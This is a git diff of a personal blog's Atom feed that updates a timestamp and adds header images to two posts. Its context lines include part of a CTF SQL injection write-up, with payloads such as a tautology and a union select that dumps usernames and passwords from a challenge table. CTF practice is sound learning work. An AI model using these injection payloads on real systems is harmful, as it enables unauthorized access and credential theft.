@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://beicheng-maker.github.io/</id>
     <title>Kang Classmate&apos;s Blog</title>
-    <updated>2021-01-18T05:57:10.596Z</updated>
+    <updated>2021-01-18T05:58:12.596Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://beicheng-maker.github.io/"/>
     <link rel="self" href="https://beicheng-maker.github.io/atom.xml"/>
@@ -191,7 +191,7 @@ php://input可以读取没有处理过的post数据
         <link href="https://beicheng-maker.github.io/post/python-chang-yong-ku">
         </link>
         <updated>2021-01-17T14:10:19.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="json">json</h1>
+        <content type="html"><![CDATA[<p><img src="https://beicheng-maker.github.io//post-images/1610949474914.jpg" alt="" loading="lazy"># json</p>
 <pre><code>import json
 _dic= {&quot;name&quot;:&quot;loop&quot;,&quot;age&quot;:&quot;12&quot;}
 s = json.dumps(_dic,indent=2) #转化为一个序列
@@ -331,7 +331,8 @@ for i in range(3):
         <link href="https://beicheng-maker.github.io/post/ctf-show-sql-zhu-ru">
         </link>
         <updated>2021-01-17T13:33:50.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="171"><em>171</em></h2>
+        <content type="html"><![CDATA[<figure data-type="image" tabindex="1"><img src="https://beicheng-maker.github.io//post-images/1610949487800.jpg" alt="" loading="lazy"></figure>
+<h2 id="171"><em>171</em></h2>
 <p>payload : 99' or 1=1--+</p>
 <h2 id="172"><em>172</em></h2>
 <p>payload:1' union select 1,(select group_concat(username,password) from ctfshow_user2)--+</p>
